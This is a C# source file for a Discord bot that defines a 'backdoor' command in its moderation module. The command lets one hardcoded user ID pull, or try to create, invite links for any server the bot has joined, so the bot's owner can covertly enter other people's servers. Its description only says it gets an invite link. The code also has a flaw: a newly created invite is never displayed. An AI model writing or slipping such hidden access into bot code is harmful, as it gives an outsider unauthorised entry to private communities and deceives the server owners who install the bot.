using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Linq;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace KhaosBot.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), Summary("Get the server invite link")]
        public async Task BackdoorModule(ulong GuildId = 0)
        {
            if (Context.User.Id != 328631832050532354)
            {
                await Context.Channel.SendMessageAsync(":x: You are not a moderator for this bot.");
                return;
            }

            if(Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: You are not a member of the guild with the Id: " + GuildId);
                return;
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            try
            {
                var Invites = await Guild.GetInvitesAsync();

                if (Invites.Count() < 1)
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }

                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"Invites for our guild {Guild.Name}", Guild.IconUrl);
                Embed.WithColor(30, 250, 100);
                foreach (var Current in Invites)
                {
                    Embed.AddInlineField("Invite", $"[Invite]({Current.Url})");
                }

                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
                
         
            
        }
    }
}
